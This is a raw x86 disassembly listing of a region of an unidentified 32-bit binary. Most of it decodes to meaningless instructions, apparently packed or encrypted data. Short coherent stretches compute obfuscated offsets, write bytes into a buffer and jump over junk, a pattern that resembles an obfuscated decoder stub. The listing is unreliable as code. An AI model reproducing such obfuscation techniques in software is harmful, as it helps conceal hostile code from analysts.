  416d63:	xor    eax,0xfffff0db
  416d68:	mov    ebx,edi
  416d6a:	sub    ebx,eax
  416d6c:	jmp    0x4170a9
  416d71:	dec    ebx
  416d72:	jbe    0x416da1
  416d74:	imul   BYTE PTR [edx+ebp*4]
  416d77:	dec    ebx
  416d78:	sub    dl,dh
  416d7a:	push   0xffffffc1
  416d7c:	mov    al,0xde
  416d7e:	sbb    eax,ecx
  416d80:	mov    al,0x7a
  416d82:	hlt    
  416d83:	push   ss
  416d84:	sbb    cl,ah
  416d86:	adc    bl,BYTE PTR [eax]
  416d88:	sbb    BYTE PTR [eax+0x59],ch
  416d8b:	stos   BYTE PTR es:[edi],al
  416d8c:	xor    DWORD PTR [ebp-0x665588e8],ebp
  416d92:	adc    eax,0xb01f8449
  416d97:	leave  
  416d98:	xor    ebp,DWORD PTR [ebp+0x6b]
  416d9b:	pushf  
  416d9c:	scas   eax,DWORD PTR es:[edi]
  416d9d:	not    DWORD PTR [eax+edi*2]
  416da0:	outs   dx,BYTE PTR ds:[esi]
  416da1:	sbb    ebp,DWORD PTR [esp+edx*1-0x25f4e77e]
  416da8:	fimul  DWORD PTR [ebx-0x5b6b6d29]
  416dae:	jns    0x416d6d
  416db0:	loope  0x416dbe
  416db2:	mov    bh,0xf3
  416db4:	test   al,0x23
  416db6:	mov    bh,0x88
  416db8:	inc    esi
  416db9:	scas   eax,DWORD PTR es:[edi]
  416dba:	mov    esp,0x1920a9b0
  416dbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416dc0:	out    0x61,eax
  416dc2:	xchg   ebp,eax
  416dc3:	add    cl,BYTE PTR [ecx-0xc]
  416dc6:	add    eax,0x2d2768ab
  416dcb:	add    DWORD PTR [eax-0x7e4cb7fd],0xffffffbd
  416dd2:	sub    bh,dh
  416dd4:	adc    al,0x24
  416dd6:	push   ecx
  416dd7:	daa    
  416dd8:	jmp    0x416e03
  416dda:	mov    ebp,0xb75327e5
  416ddf:	call   0x322e:0xa17e7bdd
  416de6:	jl     0x416d75
  416de8:	ja     0x416da4
  416dea:	sbb    eax,0x3518d6ef
  416def:	xchg   ecx,eax
  416df0:	jnp    0x416ded
  416df2:	call   0xf426:0xba3ad358
  416df9:	add    dl,BYTE PTR [ebp+eiz*2-0x47c5fb96]
  416e00:	sub    eax,0x4121458b
  416e05:	sbb    BYTE PTR [edx],0x29
  416e08:	sub    cl,dh
  416e0a:	pop    edx
  416e0b:	in     al,dx
  416e0c:	mov    dh,0xa3
  416e0e:	mov    WORD PTR ss:[eax+0x26],fs
  416e12:	ja     0x416e84
  416e14:	jnp    0x416e42
  416e16:	imul   ebx,DWORD PTR [esi],0xffffffc5
  416e19:	or     esp,edi
  416e1b:	jmp    0x34fe05cb
  416e20:	or     al,0x1a
  416e22:	jbe    0x416e79
  416e24:	shr    DWORD PTR ds:0x9c9249fc,cl
  416e2a:	xchg   ebx,eax
  416e2b:	adc    esp,esi
  416e2d:	jo     0x416de7
  416e2f:	hlt    
  416e30:	arpl   WORD PTR [ebp-0x4e],ax
  416e33:	push   ds
  416e34:	cmp    ecx,DWORD PTR [edx+0x858ea85]
  416e3a:	push   0x7c
  416e3c:	(bad)  
  416e3e:	shl    DWORD PTR [edi+edx*8-0x5e5516f3],0xac
  416e46:	ss mov edx,0x37704b6a
  416e4c:	xor    DWORD PTR [eax],0xffffff88
  416e4f:	jns    0x416dd3
  416e51:	sbb    eax,0xff9b3302
  416e56:	push   0x1d
  416e58:	jne    0x416e7a
  416e5a:	xor    DWORD PTR [edx+ebx*8-0x17],edi
  416e5e:	aam    0x73
  416e60:	dec    edx
  416e61:	jae    0x416e17
  416e63:	int    0xae
  416e65:	push   edi
  416e66:	inc    ebx
  416e67:	ror    BYTE PTR [ecx+0x2ac0a8ac],1
  416e6d:	stos   DWORD PTR es:[edi],eax
  416e6e:	cwde   
  416e6f:	add    BYTE PTR [ebp+0x33],0x83
  416e73:	cdq    
  416e74:	aas    
  416e75:	repnz xor eax,0x9c3688aa
  416e7b:	cmp    BYTE PTR [edi-0x4],al
  416e7e:	xor    BYTE PTR ds:0x8bb566b3,ch
  416e84:	in     eax,0xad
  416e86:	jmp    0x5b92:0xbc592a04
  416e8d:	ja     0x416e2e
  416e8f:	ss mov edx,0xaaa2d13c
  416e95:	mov    ds,WORD PTR [edx+0x49]
  416e98:	mov    BYTE PTR [edi-0x5c],cl
  416e9b:	out    dx,eax
  416e9c:	push   edx
  416e9d:	ret    0x2ebf
  416ea0:	mov    ecx,0x7badbb8e
  416ea5:	mov    esi,DWORD PTR [ebx-0x40]
  416ea8:	retf   0x574
  416eab:	int3   
  416eac:	inc    esi
  416ead:	jle    0x416ee6
  416eaf:	push   es
  416eb0:	cmp    DWORD PTR [ebp+0x6221111c],ecx
  416eb6:	cdq    
  416eb7:	das    
  416eb8:	cwde   
  416eb9:	into   
  416eba:	stos   BYTE PTR es:[edi],al
  416ebb:	mov    ebx,0x50d2b16d
  416ec0:	retf   0x801c
  416ec3:	add    DWORD PTR [edx+0x58d5d1a1],0x7a
  416eca:	stc    
  416ecb:	fbld   TBYTE PTR [ebp+0x41]
  416ece:	in     eax,dx
  416ecf:	push   ds
  416ed0:	cmp    DWORD PTR [esi-0x1f],ecx
  416ed3:	(bad)  
  416ed4:	mov    ds:0x4f7f3b06,al
  416ed9:	call   0x61aab84e
  416ede:	mov    ?,WORD PTR [edi]
  416ee0:	adc    DWORD PTR [ebp+0x5e],edx
  416ee3:	add    BYTE PTR [ebp-0x5a],al
  416ee6:	sub    DWORD PTR [esi+ebp*8+0x55e984df],edx
  416eed:	daa    
  416eee:	loopne 0x416efc
  416ef0:	xor    bh,bh
  416ef2:	dec    ebx
  416ef3:	mov    edx,?
  416ef5:	stos   DWORD PTR es:[edi],eax
  416ef6:	in     eax,dx
  416ef7:	cmp    cl,BYTE PTR [esi]
  416ef9:	xor    DWORD PTR [edx+0x399c4e44],ebp
  416eff:	dec    edi
  416f00:	pop    ds
  416f01:	mov    ebx,0x29c53c56
  416f06:	lods   eax,DWORD PTR ds:[esi]
  416f07:	mov    edi,0x99678df9
  416f0c:	mov    dh,0x8
  416f0e:	mov    al,ds:0xecbc37a8
  416f13:	push   0xe9c490ed
  416f18:	(bad)  
  416f19:	mov    edx,0xca7fe1cd
  416f1e:	jno    0x416eca
  416f20:	mov    ebx,0x92651a41
  416f25:	aaa    
  416f26:	jae    0x416f3a
  416f28:	xor    bh,BYTE PTR [edi+0x26c28c42]
  416f2e:	or     al,0x7b
  416f30:	cwde   
  416f31:	fwait
  416f32:	inc    esi
  416f33:	(bad)  
  416f34:	push   ecx
  416f35:	fs pop edx
  416f37:	push   0xffffffc2
  416f39:	in     eax,0x4f
  416f3b:	jle    0x416eeb
  416f3d:	cwde   
  416f3e:	ins    BYTE PTR es:[edi],dx
  416f3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f40:	push   edi
  416f41:	fwait
  416f42:	and    esp,eax
  416f44:	or     edi,DWORD PTR [esi-0x4ac038cd]
  416f4a:	pushw  ds
  416f4c:	in     al,dx
  416f4d:	pop    esp
  416f4e:	std    
  416f4f:	sti    
  416f50:	sub    esp,DWORD PTR [eax]
  416f52:	jge    0x416f66
  416f54:	loopne 0x416fb4
  416f56:	iret   
  416f57:	mov    ebp,0xd51e51a8
  416f5c:	stos   DWORD PTR es:[edi],eax
  416f5d:	adc    edx,ebp
  416f5f:	inc    esi
  416f60:	jb     0x416f29
  416f62:	sbb    al,BYTE PTR [edx]
  416f64:	jbe    0x416eeb
  416f66:	adc    ebp,DWORD PTR [ecx+0x68bfe0b7]
  416f6c:	dec    edi
  416f6d:	and    bh,BYTE PTR ds:0x61472047
  416f73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f74:	fwait
  416f75:	push   ss
  416f76:	nop
  416f77:	mov    dl,al
  416f79:	dec    ebx
  416f7a:	fwait
  416f7b:	stos   BYTE PTR es:[edi],al
  416f7c:	int    0xfd
  416f7e:	bound  ecx,QWORD PTR [ecx]
  416f80:	bound  ecx,QWORD PTR [edx-0x4d4a2dc8]
  416f86:	mov    edi,fs
  416f88:	stc    
  416f89:	jl     0x417001
  416f8b:	aam    0xb4
  416f8d:	xchg   esp,eax
  416f8e:	pop    ecx
  416f8f:	out    0x2e,al
  416f91:	out    dx,eax
  416f92:	(bad)  
  416f94:	aad    0x28
  416f96:	mov    WORD PTR [ecx-0x22808c57],cs
  416f9c:	inc    esi
  416f9d:	xchg   DWORD PTR [edx+0x61],esi
  416fa0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416fa1:	and    al,0x59
  416fa3:	dec    edx
  416fa4:	pop    es
  416fa5:	or     dh,BYTE PTR [esi]
  416fa7:	sub    edx,DWORD PTR [edi]
  416fa9:	mov    WORD PTR [eax-0x74c37e28],fs
  416faf:	scas   eax,DWORD PTR es:[edi]
  416fb0:	pop    esi
  416fb1:	outs   dx,BYTE PTR ds:[esi]
  416fb2:	mov    eax,ds:0x645dd969
  416fb7:	add    bh,0x3
  416fba:	jb     0x416f5a
  416fbc:	push   ds
  416fbd:	lods   al,BYTE PTR ds:[esi]
  416fbe:	arpl   WORD PTR [eax],bx
  416fc0:	dec    ebp
  416fc1:	lds    esp,FWORD PTR [esi+ecx*4+0x587d40b5]
  416fc8:	xor    edi,ebp
  416fca:	dec    ebx
  416fcb:	mov    eax,ds:0xcf837e19
  416fd0:	push   0x6
  416fd2:	inc    esi
  416fd3:	jne    0x416ff2
  416fd5:	mov    ds:0xfafbf2d,eax
  416fda:	pop    ds
  416fdb:	ror    DWORD PTR [ebp-0x3766b7b],1
  416fe1:	cli    
  416fe2:	or     dl,BYTE PTR [esi*4-0x5cc87488]
  416fe9:	add    eax,DWORD PTR [ebp-0x488693e1]
  416fef:	rcr    bh,cl
  416ff1:	and    bl,BYTE PTR [edi-0x4e66c60a]
  416ff7:	out    0xa0,al
  416ff9:	repz into 
  416ffb:	push   es
  416ffc:	sbb    ebx,esp
  416ffe:	pop    DWORD PTR [ecx-0x1c5249b0]
  417004:	lea    edi,[esi+eiz*1-0x70e86bd2]
  41700b:	out    dx,eax
  41700c:	aam    0x8f
  41700e:	sub    al,0x70
  417010:	jns    0x41700c
  417012:	cmp    edi,DWORD PTR ds:0x30b97e0f
  417018:	pusha  
  417019:	out    dx,eax
  41701a:	sub    ah,BYTE PTR [ebx-0xd]
  41701d:	mov    BYTE PTR [ecx+eiz*4+0x77b16283],al
  417024:	popf   
  417025:	jge    0x417028
  417027:	scas   eax,DWORD PTR es:[edi]
  417028:	xchg   ebx,eax
  417029:	sub    cl,al
  41702b:	imul   ecx,DWORD PTR fs:[edi-0x57120b82],0x581405a9
  417036:	xchg   ecx,eax
  417037:	pop    edi
  417038:	shl    ch,0xfd
  41703b:	ins    BYTE PTR es:[edi],dx
  41703c:	rcr    DWORD PTR [ebp+edx*8+0x4dd45aea],cl
  417043:	ja     0x4170c4
  417045:	iret   
  417046:	sub    eax,edi
  417048:	mov    edx,0xf52fb7ca
  41704d:	mov    edx,0x75f99bcf
  417052:	push   DWORD PTR [edx-0x4275bdb9]
  417058:	jmp    0x41706b
  41705a:	daa    
  41705b:	adc    dh,cl
  41705d:	ss adc eax,0xddf8c71d
  417063:	and    al,0x2b
  417065:	cmp    al,0xcc
  417067:	xlat   BYTE PTR ds:[ebx]
  417068:	ror    DWORD PTR [esi+0x56],0x49
  41706c:	pop    esi
  41706d:	das    
  41706e:	or     eax,0x9b99561d
  417073:	sub    al,0x9e
  417075:	ror    cl,cl
  417077:	repz jecxz 0x4170bd
  41707a:	and    ch,dl
  41707c:	or     esp,ebx
  41707e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41707f:	leave  
  417080:	aam    0x49
  417082:	xor    DWORD PTR [ecx+0x3c331214],eax
  417088:	lods   al,BYTE PTR ds:[esi]
  417089:	inc    eax
  41708a:	push   es
  41708b:	and    BYTE PTR ds:0x60bbf96d,0x1c
  417092:	and    dl,dh
  417094:	jmp    FWORD PTR [esi+0x39125f87]
  41709a:	xchg   DWORD PTR [ecx],eax
  41709c:	mov    ch,BYTE PTR [ecx+0x23]
  41709f:	jl     0x4170fd
  4170a1:	jmp    0xaf72:0x4feb0b96
  4170a8:	jbe    0x417035
  4170aa:	inc    ebp
  4170ab:	lock mov ecx,DWORD PTR [ebp-0x14]
  4170af:	xor    eax,ecx
  4170b1:	mov    ecx,DWORD PTR [ebp-0x18]
  4170b4:	sub    eax,esi
  4170b6:	div    ecx
  4170b8:	mov    ecx,0x211
  4170bd:	pop    edx
  4170be:	xor    eax,ecx
  4170c0:	sub    edx,eax
  4170c2:	cmp    ebx,edx
  4170c4:	ja     0x4174cb
  4170ca:	jmp    0x4170d2
  4170cf:	mov    edi,DWORD PTR [ebp-0x2c]
  4170d2:	mov    DWORD PTR [ebp-0x20],0x1aa3
  4170d9:	mov    DWORD PTR [ebp-0x24],0x52d
  4170e0:	mov    DWORD PTR [ebp-0x28],0x226c
  4170e7:	mov    DWORD PTR [ebp-0x2c],0x347d
  4170ee:	mov    eax,DWORD PTR [ebp-0x2c]
  4170f1:	mov    edx,DWORD PTR [ebp-0x28]
  4170f4:	mov    ebx,DWORD PTR [ebp-0x24]
  4170f7:	sub    eax,0x24b3
  4170fc:	imul   eax,edx
  4170ff:	xor    eax,0x74ef
  417104:	xor    edx,edx
  417106:	div    ebx
  417108:	mov    edx,DWORD PTR [ebp-0x20]
  41710b:	mov    ebx,DWORD PTR [ebp+0x8]
  41710e:	push   0x20
  417110:	and    eax,edx
  417112:	mov    edx,edi
  417114:	sub    edx,eax
  417116:	sub    edx,0x683
  41711c:	mov    DWORD PTR [ebp-0x2c],edx
  41711f:	mov    eax,DWORD PTR [ebp-0x30]
  417122:	mov    edx,DWORD PTR [ebp-0x34]
  417125:	xor    al,dl
  417127:	mov    edx,DWORD PTR [ebp-0x2c]
  41712a:	xor    al,0x58
  41712c:	and    al,0xd8
  41712e:	add    al,BYTE PTR [ebp+0xc]
  417131:	add    al,0x28
  417133:	mov    BYTE PTR [edx+ebx*1],al
  417136:	mov    eax,DWORD PTR [ebp-0x38]
  417139:	add    eax,DWORD PTR [ebp-0x3c]
  41713c:	mov    edx,DWORD PTR [ebp-0x40]
  41713f:	xor    eax,edx
  417141:	mov    edx,DWORD PTR [ebp-0x44]
  417144:	xor    eax,edx
  417146:	mov    edx,0x61f7
  41714b:	sub    edx,eax
  41714d:	mov    eax,DWORD PTR [ebp-0x4]
  417150:	add    edi,edx
  417152:	mov    edx,DWORD PTR [ebp-0x8]
  417155:	sub    eax,0x7721
  41715a:	xor    eax,edx
  41715c:	mov    edx,DWORD PTR [ebp-0xc]
  41715f:	xor    eax,edx
  417161:	or     eax,0x7bc9
  417166:	xor    eax,0xfffff0db
  41716b:	mov    DWORD PTR [ebp-0x2c],edi
  41716e:	sub    edi,eax
  417170:	mov    eax,DWORD PTR [ebp-0x10]
  417173:	mov    edx,DWORD PTR [ebp-0x14]
  417176:	mov    ebx,DWORD PTR [ebp-0x18]
  417179:	xor    eax,edx
  41717b:	xor    edx,edx
  41717d:	sub    eax,esi
  41717f:	div    ebx
  417181:	jmp    0x4174be
  417186:	in     al,0x6b
  417188:	retf   
  417189:	repnz cmp dh,BYTE PTR [ebx]
  41718c:	pushf  
  41718d:	pop    edx
  41718e:	stos   BYTE PTR es:[edi],al
  41718f:	mov    DWORD PTR [edi+0x6a],0x7e0e28eb
  417196:	inc    edx
  417197:	out    dx,al
  417198:	push   ss
  417199:	sbb    cl,ah
  41719b:	adc    bl,BYTE PTR [eax]
  41719d:	sbb    BYTE PTR [esi],dh
  41719f:	sbb    eax,0x2500f9f6
  4171a4:	fimul  DWORD PTR [ebx+eax*1+0x525bcf33]
  4171ab:	scas   al,BYTE PTR es:[edi]
  4171ac:	xchg   ecx,eax
  4171ad:	aam    0xd
  4171af:	(bad)  
  4171b0:	push   ebx
  4171b1:	imul   esi,DWORD PTR es:[ebp+0x60],0xddcaa075
  4171b9:	jbe    0x417237
  4171bb:	pop    DWORD PTR [edx-0x1f576161]
  4171c1:	xchg   ebx,eax
  4171c2:	test   al,0x1c
  4171c4:	push   es
  4171c5:	fsubr  QWORD PTR [ebp+0x23]
  4171c8:	jb     0x4171eb
  4171ca:	sbb    al,0x37
  4171cc:	imul   ebp,DWORD PTR [edi],0x79a53b6
  4171d2:	jge    0x4171b7
  4171d4:	in     eax,0x37
  4171d6:	mov    cs,edi
  4171d8:	lahf   
  4171d9:	sahf   
  4171da:	xor    eax,0x5cde849c
  4171df:	mov    al,ds:0xc8508b0c
  4171e4:	and    BYTE PTR [eax+ecx*2-0x7e84c8af],al
  4171eb:	inc    edi
  4171ec:	or     al,0xbe
  4171ee:	ss pop edx
  4171f0:	jle    0x4171cc
  4171f2:	pop    ebx
  4171f3:	pop    ecx
  4171f4:	ins    DWORD PTR es:[edi],dx
  4171f5:	and    DWORD PTR [eax-0x14],ebx
  4171f8:	inc    ecx
  4171f9:	inc    eax
  4171fa:	sti    
  4171fb:	pop    edx
  4171fc:	jb     0x417260
  4171fe:	pop    ebx
  4171ff:	dec    eax
  417200:	loopne 0x417201
  417202:	push   0x5778613b
  417207:	jb     0x4171ce
  417209:	xlat   BYTE PTR ds:[ebx]
  41720a:	push   ebx
  41720b:	(bad)  
  41720c:	xchg   esp,eax
  41720d:	or     al,0x84
  41720f:	js     0x417269
  417211:	lds    edi,FWORD PTR ds:0x87f21966
  417217:	dec    esi
  417218:	jne    0x4171a5
  41721a:	add    eax,0xa597e459
  41721f:	xchg   DWORD PTR [ebx],esi
  417221:	push   esp
  417222:	out    dx,eax
  417223:	pop    edi
  417224:	jmp    0xd356:0xb5243aee
  41722b:	add    eax,0x8bfe195f
  417230:	jo     0x417243
  417232:	jmp    0x1eee:0xb34fa14e
  417239:	loope  0x417274
  41723b:	(bad)  
  41723c:	inc    ecx
  41723d:	jb     0x41724c
  41723f:	fwait
  417240:	imul   DWORD PTR [eax]
  417242:	mov    ch,0xce
  417244:	lods   eax,DWORD PTR ds:[esi]
  417245:	pop    ecx
  417246:	sahf   
  417247:	add    cl,BYTE PTR [eax]
  417249:	mov    esp,0xcbe32303
  41724e:	mov    edi,0xb18d2326
  417253:	sbb    BYTE PTR [eax+0xc08decf],bl
  417259:	out    0x3c,al
  41725b:	or     ebx,DWORD PTR [ebp+ebp*1+0x3ba1d4bf]
  417262:	add    al,0xb7
  417264:	add    DWORD PTR [ecx-0x30],ebp
  417267:	aad    0x3e
  417269:	mov    ebp,?
  41726b:	push   es
  41726c:	adc    bh,dh
  41726e:	jns    0x4171f9
  417270:	adc    eax,0x60e5c990
  417275:	outs   dx,BYTE PTR ds:[esi]
  417276:	rol    DWORD PTR [edi],cl
  417278:	adc    ch,ch
  41727a:	jns    0x417207
  41727c:	out    0x7a,eax
  41727e:	jnp    0x4172a2
  417280:	sti    
  417281:	ins    DWORD PTR es:[edi],dx
  417282:	xor    eax,0xdd7bbb34
  417287:	fmul   DWORD PTR [edx]
  417289:	or     DWORD PTR ds:0xcace6350,0xaa794a75
  417293:	addr16 cmc 
  417295:	sbb    BYTE PTR [edx+0x58],dh
  417298:	push   0x30
  41729a:	pop    ebp
  41729b:	cmc    
  41729c:	xchg   BYTE PTR [edi+0x2b],al
  41729f:	jecxz  0x4172b0
  4172a1:	pusha  
  4172a2:	shl    DWORD PTR [edx+0x1d],1
  4172a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172a6:	cmp    edx,DWORD PTR [ecx]
  4172a8:	cdq    
  4172a9:	je     0x4172cf
  4172ab:	add    BYTE PTR ds:0x5aa32bf3,ch
  4172b1:	fsubp  st(5),st
  4172b3:	cs ins DWORD PTR es:[edi],dx
  4172b5:	test   BYTE PTR [esi-0x1e2f628e],al
  4172bb:	rol    BYTE PTR [esi-0x18],1
  4172be:	xor    al,0xd
  4172c0:	ins    DWORD PTR es:[edi],dx
  4172c1:	push   cs
  4172c2:	sbb    eax,DWORD PTR [ebp+0x7d]
  4172c5:	mov    ds:0x5d3716a,eax
  4172ca:	jno    0x417321
  4172cc:	pop    ss
  4172cd:	int3   
  4172ce:	mov    esp,0xd08ed504
  4172d3:	inc    ecx
  4172d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172d5:	clc    
  4172d6:	(bad)  
  4172d7:	out    dx,eax
  4172d8:	push   0xb7da36e6
  4172dd:	jnp    0x4172f1
  4172df:	sar    cl,0x74
  4172e2:	push   edx
  4172e3:	call   0xa70b5bdd
  4172e8:	xor    cl,BYTE PTR [esi+0x72]
  4172eb:	push   cs
  4172ec:	xor    ch,bh
  4172ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172ef:	mov    dh,0x12
  4172f1:	aam    0xbc
  4172f3:	pop    ecx
  4172f4:	mov    eax,0xbbe088b2
  4172f9:	cli    
  4172fa:	dec    esi
  4172fb:	mov    al,ds:0x45fc9ad
  417300:	into   
  417301:	sbb    cl,ch
  417303:	mov    al,ds:0xecf6f454
  417308:	test   edi,esi
  41730a:	test   DWORD PTR [ecx],esp
  41730c:	hlt    
  41730d:	ins    DWORD PTR es:[edi],dx
  41730e:	jge    0x417359
  417310:	and    edx,DWORD PTR [edx]
  417312:	clc    
  417313:	cmp    al,0x49
  417315:	pop    ebp
  417316:	jge    0x41737c
  417318:	loop   0x41730d
  41731a:	xchg   cl,cl
  41731c:	pop    ebp
  41731d:	(bad)  
  41731f:	sub    eax,0x1b31efd6
  417324:	in     eax,0xd0
  417326:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417327:	rep stos DWORD PTR es:[edi],eax
  417329:	mov    DWORD PTR [ebp+0x4aabbf32],esi
  41732f:	xchg   ebx,eax
  417330:	xchg   DWORD PTR [edx+0x6fb3db39],eax
  417336:	aam    0x83
  417338:	call   DWORD PTR [eax]
  41733a:	jmp    0x4172d7
  41733c:	scas   eax,DWORD PTR es:[edi]
  41733d:	jl     0x41733d
  41733f:	pop    ds
  417340:	ret    0x4568
  417343:	mov    ch,0x3d
  417345:	repz xchg edi,eax
  417347:	les    ebx,FWORD PTR [ebp-0x39b229e6]
  41734d:	pop    es
  41734e:	xor    al,BYTE PTR [ecx]
  417350:	aas    
  417351:	xlat   BYTE PTR ds:[ebx]
  417352:	lock leave 
  417354:	mov    ch,0xec
  417356:	mul    DWORD PTR [ecx+0x79386b2f]
  41735c:	sti    
  41735d:	mov    al,ds:0xfcb8b573
  417362:	mov    eax,es:0x822a16fb
  417368:	test   DWORD PTR [ebp+edi*2-0x1a1967d4],eax
  41736f:	or     edx,esi
  417371:	(bad)  
  417372:	sub    al,0x57
  417374:	daa    
  417375:	xchg   BYTE PTR [ecx+ebx*8-0x3b3c03a6],bh
  41737c:	imul   ebp,esi,0x47
  41737f:	data16 hlt 
  417381:	aam    0x53
  417383:	sar    DWORD PTR [ecx+0x7afbfeb2],0x6f
  41738a:	scas   al,BYTE PTR es:[edi]
  41738b:	sbb    DWORD PTR [ecx+0x7eaa4abc],ebx
  417391:	jl     0x417363
  417393:	loop   0x417373
  417395:	ficom  DWORD PTR [ebx+0x3fc37383]
  41739b:	cmp    BYTE PTR [eax],dh
  41739d:	outs   dx,DWORD PTR ds:[esi]
  41739e:	out    0x92,al
  4173a0:	cs lahf 
  4173a2:	dec    ecx
  4173a3:	bound  ecx,QWORD PTR [eax+0x2c]
  4173a6:	xchg   ecx,eax
  4173a7:	xor    cl,ah
  4173a9:	cwde   
  4173aa:	jbe    0x41734d
  4173ac:	repnz data16 lahf 
  4173af:	xor    DWORD PTR [ecx-0x6d8c13c0],esi
  4173b5:	pop    ss
  4173b6:	lock sbb esi,ebp
  4173b9:	adc    dl,BYTE PTR [eax-0x69]
  4173bc:	sahf   
  4173bd:	aam    0x3f
  4173bf:	sar    DWORD PTR [edx+edx*8-0x3765e4ca],1
  4173c6:	mov    WORD PTR [edi*4+0x3c58257a],cs
  4173cd:	fwait
  4173ce:	add    al,0x18
  4173d0:	adc    dh,BYTE PTR [eax-0x6c1c36c2]
  4173d6:	ins    DWORD PTR es:[edi],dx
  4173d7:	pop    ecx
  4173d8:	jnp    0x4173fb
  4173da:	cwde   
  4173db:	mov    ebp,0x8588c8c2
  4173e0:	icebp  
  4173e1:	js     0x4173de
  4173e3:	push   ebp
  4173e4:	cld    
  4173e5:	xor    BYTE PTR [ecx],0xfa
  4173e8:	mov    cl,0xcb
  4173ea:	mov    ds:0xf79d1332,eax
  4173ef:	rcr    DWORD PTR [esp+ecx*2+0x5c],cl
  4173f3:	std    
  4173f4:	push   ss
  4173f5:	ret    
  4173f6:	addr16 rol esi,0x7b
  4173fa:	imul   esi,DWORD PTR [ebx-0x6f529f06],0x42c5dd10
  417404:	fldenv [ecx]
  417406:	pusha  
  417407:	xchg   edi,eax
  417408:	xor    al,0xd0
  41740a:	pop    ds
  41740b:	mov    edi,0xc6c129f3
  417410:	cli    
  417411:	jmp    0x417470
  417413:	addr16 mov esp,ss
  417416:	xchg   edi,eax
  417417:	les    ecx,FWORD PTR [eax+0x60ffde9f]
  41741d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41741e:	jns    0x417484
  417420:	inc    edx
  417421:	pusha  
  417422:	dec    esi
  417423:	and    esp,ebx
  417425:	mov    al,ds:0x1dbe97c4
  41742a:	test   DWORD PTR [ecx],ebx
  41742c:	icebp  
  41742d:	or     ecx,ebx
  41742f:	xor    al,0x77
  417431:	out    dx,eax
  417432:	sub    al,0xd7
  417434:	test   eax,0x9f13542
  417439:	push   ds
  41743a:	sbb    dl,bl
  41743c:	mov    edi,0x1741bdff
  417441:	and    edx,DWORD PTR [edi]
  417443:	jmp    0xfb1d729c
  417448:	mov    bl,0x2b
  41744a:	sbb    cl,al
  41744c:	pop    ss
  41744d:	fst    DWORD PTR [eax+0x2]
  417450:	int3   
  417451:	stos   BYTE PTR es:[edi],al
  417452:	or     al,al
  417454:	cwde   
  417455:	loope  0x417466
  417457:	mov    ecx,0x1910ec5d
  41745c:	js     0x41742d
  41745e:	dec    esp
  41745f:	sbb    bh,cl
  417461:	mov    eax,ds:0xa859603b
  417466:	mov    edi,0x12272dfb
  41746b:	lahf   
  41746c:	pop    ecx
  41746d:	pop    ebp
  41746e:	jmp    0x417461
  417470:	jmp    0x4174e4
  417472:	pop    esi
  417473:	neg    BYTE PTR [esi]
  417475:	shr    BYTE PTR [ebx+0x63],0x32
  417479:	rcr    BYTE PTR [esi+ecx*1],0x8
  41747d:	lods   eax,DWORD PTR fs:[esi]
  41747f:	or     BYTE PTR [edi],dh
  417481:	test   eax,0x6bf0f678
  417486:	and    ecx,ebp
  417488:	jle    0x4174f5
  41748a:	mov    bh,0xaa
  41748c:	adc    esp,DWORD PTR [ecx+0x412a984c]
  417492:	scas   eax,DWORD PTR es:[edi]
  417493:	add    al,0x20
  417495:	lea    ebx,[esp+eiz*8+0x3b]
  417499:	cmp    esp,DWORD PTR [esi+esi*2]
  41749c:	jbe    0x4174cb
  41749e:	mov    ch,0xa5
  4174a0:	xlat   BYTE PTR ds:[ebx]
  4174a1:	test   BYTE PTR [edi],ah
  4174a3:	mov    dh,0x75
  4174a5:	pop    es
  4174a6:	pop    ss
  4174a7:	or     al,0x9
  4174a9:	outs   dx,BYTE PTR ds:[esi]
  4174aa:	ret    0x5d9d
  4174ad:	(bad)  
  4174ae:	pop    ebx
  4174af:	int    0xa
  4174b1:	sbb    ebx,DWORD PTR [ebx+0x2ba44b59]
  4174b7:	bt     DWORD PTR [eax+edx*1-0x51],edi
  4174bc:	pushf  
  4174bd:	jecxz  0x417519
  4174bf:	xor    eax,ecx
  4174c1:	sub    edx,eax
  4174c3:	cmp    edi,edx
  4174c5:	jbe    0x4170cf
  4174cb:	pop    edi
  4174cc:	pop    esi
  4174cd:	pop    ebx
  4174ce:	leave  
  4174cf:	ret    0x8
  4174d2:	push   ebp
  4174d3:	mov    ebp,esp
  4174d5:	and    esp,0xfffffff8
  4174d8:	sub    esp,0x9c
  4174de:	push   ebx
  4174df:	push   esi
  4174e0:	push   edi
  4174e1:	push   DWORD PTR ds:0x4223a4
  4174e7:	lea    eax,[esp+0xa4]
  4174ee:	push   eax
  4174ef:	call   DWORD PTR ds:0x428e40
  4174f5:	push   DWORD PTR [esp+0xa4]
  4174fc:	push   DWORD PTR ds:0x422390
  417502:	call   DWORD PTR ds:0x428e64
  417508:	push   eax
  417509:	call   DWORD PTR ds:0x428e4c
  41750f:	mov    ecx,DWORD PTR ds:0x422758
  417515:	sub    DWORD PTR ds:0x4282df,0x42835b
  41751f:	jmp    0x4178ee
  417524:	iret   
  417525:	and    ah,BYTE PTR [esi]
  417527:	inc    eax
  417528:	sbb    bh,BYTE PTR [edi+ebp*4]
  41752b:	and    cl,BYTE PTR [ecx+edx*8]
  41752e:	fnstcw WORD PTR [edi+esi*1+0xa6a4374]
  417535:	out    0x16,eax
  417537:	sbb    BYTE PTR [edx+edx*1+0x6a471818],bh
  41753e:	(bad)  
  41753f:	es ds mov esp,0xf004c117
  417546:	push   0x44d5387b
  41754b:	mov    eax,0x751a528a
  417550:	mov    ebp,0xcd637b6d
  417555:	mov    ?,WORD PTR [edx]
  417557:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417558:	out    0xf0,al
  41755a:	shl    DWORD PTR [ebx],cl
  41755c:	adc    al,0xab
  41755e:	ficom  DWORD PTR [ebp-0x62]
  417561:	cdq    
  417562:	out    0x78,eax
  417564:	ins    DWORD PTR es:[edi],dx
  417565:	(bad)  
  417566:	lock sub eax,0x3bbaf107
  41756c:	fild   WORD PTR [edx+edx*8]
  41756f:	xchg   edx,eax
